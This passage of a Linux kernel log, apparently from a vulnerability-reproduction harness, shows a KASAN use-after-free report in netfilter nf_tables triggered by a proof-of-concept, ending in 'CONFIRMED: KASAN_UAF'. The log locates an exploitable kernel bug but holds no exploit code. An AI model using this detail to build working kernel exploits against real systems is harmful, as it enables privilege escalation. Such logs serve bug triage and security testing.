[    3.057948]  ? __alloc_skb+0xd4/0x280
[    3.058580]  ? netlink_sendmsg+0x83a/0xc60
[    3.059294]  ? sock_sendmsg+0x13d/0x180
[    3.059944]  ? __sys_sendto+0x1eb/0x2b0
[    3.060535]  ? __x64_sys_sendto+0xdb/0x1b0
[    3.061219]  ? do_syscall_64+0x3b/0x90
[    3.061821]  netlink_rcv_skb+0x12f/0x370
[    3.062401]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    3.063097]  ? cred_has_capability.isra.0+0x13a/0x230
[    3.063670]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    3.064165]  ? __pfx_cred_has_capability.isra.0+0x10/0x10
[    3.064744]  ? security_capable+0x6c/0xb0
[    3.065177]  nfnetlink_rcv+0x14b/0x360
[    3.066046]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    3.067159]  ? kmalloc_reserve+0x110/0x1e0
[    3.067776]  netlink_unicast+0x588/0x7f0
[    3.068337]  ? __pfx_netlink_unicast+0x10/0x10
[    3.068979]  netlink_sendmsg+0x7b7/0xc60
[    3.069558]  ? __pfx_netlink_sendmsg+0x10/0x10
[    3.070201]  ? __pfx_netlink_sendmsg+0x10/0x10
[    3.070825]  sock_sendmsg+0x13d/0x180
[    3.071364]  __sys_sendto+0x1eb/0x2b0
[    3.071905]  ? __pfx___sys_sendto+0x10/0x10
[    3.072491]  ? _raw_spin_lock_irq+0x81/0xe0
[    3.073103]  ? __rseq_handle_notify_resume+0x7ce/0xc20
[    3.073836]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    3.074432]  ? ksys_write+0xf9/0x1d0
[    3.074914]  __x64_sys_sendto+0xdb/0x1b0
[    3.075429]  ? exit_to_user_mode_prepare+0x2a/0x110
[    3.076071]  ? syscall_exit_to_user_mode+0x21/0x50
[    3.076732]  do_syscall_64+0x3b/0x90
[    3.077275]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.078305] RIP: 0033:0x44f9e3
[    3.078928] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 41 59 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    3.082427] RSP: 002b:00007ffdb71d4f88 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    3.084366] RAX: ffffffffffffffda RBX: 00000000019a3860 RCX: 000000000044f9e3
[    3.086385] RDX: 0000000000000028 RSI: 00000000019916f0 RDI: 0000000000000003
[    3.087648] RBP: 00000000019916f0 R08: 000000000048fc28 R09: 000000000000000c
[    3.088669] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffdb71d4fa0
[    3.089707] R13: 00000000019a3860 R14: 0000000000000010 R15: 0000000000000088
[    3.091220]  </TASK>
[    3.091642] 
[    3.091892] Allocated by task 61:
[    3.092421]  kasan_save_stack+0x33/0x60
[    3.092989]  kasan_set_track+0x25/0x30
[    3.093552]  __kasan_kmalloc+0x8f/0xa0
[    3.094110]  __kmalloc+0x59/0x160
[    3.094615]  nft_obj_init+0x186/0x310
[    3.095033]  nf_tables_newobj+0x933/0x1650
[    3.095554]  nfnetlink_rcv_batch+0x129a/0x1fc0
[    3.096640]  nfnetlink_rcv+0x2df/0x360
[    3.097426]  netlink_unicast+0x588/0x7f0
[    3.098095]  netlink_sendmsg+0x7b7/0xc60
[    3.098873]  sock_sendmsg+0x13d/0x180
[    3.099590]  __sys_sendto+0x1eb/0x2b0
[    3.100205]  __x64_sys_sendto+0xdb/0x1b0
[    3.100892]  do_syscall_64+0x3b/0x90
[    3.101663]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.102717] 
[    3.103142] Freed by task 48:
[    3.104062]  kasan_save_stack+0x33/0x60
[    3.105193]  kasan_set_track+0x25/0x30
[    3.105766]  kasan_save_free_info+0x2b/0x50
[    3.106358]  __kasan_slab_free+0x10a/0x180
[    3.106950]  __kmem_cache_free+0x82/0x1c0
[    3.108146]  nf_tables_trans_destroy_work+0x49f/0xb10
[    3.109138]  process_one_work+0x801/0x1500
[    3.109769]  worker_thread+0x7e2/0x1390
[    3.110323]  kthread+0x29b/0x370
[    3.110806]  ret_from_fork+0x29/0x50
[    3.111336] 
[    3.111578] The buggy address belongs to the object at ffff888103c57600
[    3.111578]  which belongs to the cache kmalloc-256 of size 256
[    3.113828] The buggy address is located 32 bytes inside of
[    3.113828]  freed 256-byte region [ffff888103c57600, ffff888103c57700)
[    3.116627] 
[    3.117060] The buggy address belongs to the physical page:
[    3.118226] page:0000000020e5fd74 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x103c56
[    3.119997] head:0000000020e5fd74 order:1 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    3.121426] flags: 0x200000000010200(slab|head|node=0|zone=2)
[    3.122575] page_type: 0xffffffff()
[    3.123360] raw: 0200000000010200 ffff888100041b40 dead000000000122 0000000000000000
[    3.124529] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    3.125653] page dumped because: kasan: bad access detected
[    3.126499] 
[    3.126748] Memory state around the buggy address:
[    3.127503]  ffff888103c57500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.128573]  ffff888103c57580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.129663] >ffff888103c57600: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.130715]                                ^
[    3.131362]  ffff888103c57680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.132410]  ffff888103c57700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.133580] ==================================================================
[    3.134839] Disabling lock debugging due to kernel taint
[+] poc finished
[    3.137656] poc (61) used greatest stack depth: 24504 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    4.541434] ACPI: PM: Preparing to enter system sleep state S5
[    4.543702] reboot: Power down
CONFIRMED: KASAN_UAF
